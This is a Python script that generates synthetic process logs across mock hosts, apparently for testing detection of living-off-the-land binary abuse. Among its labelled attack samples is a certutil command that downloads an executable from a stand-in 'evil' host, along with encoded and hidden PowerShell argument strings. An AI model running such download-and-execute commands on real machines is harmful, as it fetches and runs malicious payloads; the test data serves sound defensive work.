# Placeholder for log generator script 

import argparse
import json
import os
import random
import time
from datetime import datetime, timedelta
from pathlib import Path

# Constants
BENIGN_PROCS = ["calc.exe", "explorer.exe", "notepad.exe", "mspaint.exe"]
NEAR_MISS_PROCS = ["powershell.exe", "certutil.exe"]
LOL_BIN_ATTACKS = [
    {"process": "powershell.exe", "args": "-enc <base64>"},
    {"process": "certutil.exe", "args": "-urlcache -split -f http://evil/evil.exe"},
    {"process": "wmiprvse.exe", "args": "spawn evil.ps1"},
]

EVENTS_PER_ROTATE = 1000000  # Rotate file every 1M events
PROGRESS_INTERVAL = 100000   # Print progress every 100k events
STAGNANT_TIMEOUT = 30        # seconds


def parse_args():
    parser = argparse.ArgumentParser(description="Generate mock LOLBin logs.")
    parser.add_argument("--hosts", type=int, default=25, help="Number of hosts")
    parser.add_argument("--total", type=float, default=3e7, help="Total events (float, e.g. 3e7)")
    parser.add_argument("--days", type=int, default=1, help="Number of days to spread events over")
    parser.add_argument("--mini", action="store_true", help="Generate 10k events for quick test")
    return parser.parse_args()


def make_event(host, ts, event_type):
    if event_type == "benign":
        proc = random.choice(BENIGN_PROCS)
        args = ""
        attack = False
    elif event_type == "near_miss":
        proc = random.choice(NEAR_MISS_PROCS)
        if proc == "powershell.exe":
            args = "-nop -w hidden"
        else:
            args = "-decode localfile.txt"
        attack = False
    else: 
        attack_obj = random.choice(LOL_BIN_ATTACKS)
        proc = attack_obj["process"]
        args = attack_obj["args"]
        attack = True
    return {
        "@timestamp": ts.isoformat(),
        "host": host,
        "process": proc,
        "args": args,
        "attack": attack
    }


def main():
    args = parse_args()
    total_events = int(1e4) if args.mini else int(args.total)
    hosts = [f"host-{i+1:02d}" for i in range(args.hosts)]
    days = args.days
    logs_dir = Path("logs")
    logs_dir.mkdir(exist_ok=True)

    # Spread events over time
    start_time = datetime.utcnow() - timedelta(days=days)
    end_time = datetime.utcnow()
    time_range = (end_time - start_time).total_seconds()

    # Per-host file handles and counters
    file_handles = {}
    file_event_counts = {}
    file_indices = {h: 0 for h in hosts}

    for h in hosts:
        fname = logs_dir / f"{h}.ndjson"
        file_handles[h] = open(fname, "w")
        file_event_counts[h] = 0

    last_progress = time.time()
    stagnant_counter = 0

    for i in range(1, total_events + 1):
        r = random.random()
        if r < 0.90:
            event_type = "benign"
        elif r < 0.99:
            event_type = "near_miss"
        else:
            event_type = "true_attack"

        host = random.choice(hosts)
        ts = start_time + timedelta(seconds=random.uniform(0, time_range))
        event = make_event(host, ts, event_type)
        fh = file_handles[host]
        fh.write(json.dumps(event) + "\n")
        file_event_counts[host] += 1

        if file_event_counts[host] % EVENTS_PER_ROTATE == 0:
            fh.close()
            file_indices[host] += 1
            fname = logs_dir / f"{host}_{file_indices[host]}.ndjson"
            file_handles[host] = open(fname, "w")

        if i % PROGRESS_INTERVAL == 0:
            now = time.time()
            print(f"Generated {i}/{total_events} events...")
            if now - last_progress > STAGNANT_TIMEOUT:
                print("Log generation appears stagnant. Aborting. Try --mini.")
                for fh in file_handles.values():
                    fh.close()
                exit(1)
            last_progress = now

    for fh in file_handles.values():
        fh.close()
    print(f"Done. Generated {total_events} events across {len(hosts)} hosts in logs/.")

if __name__ == "__main__":
    main() 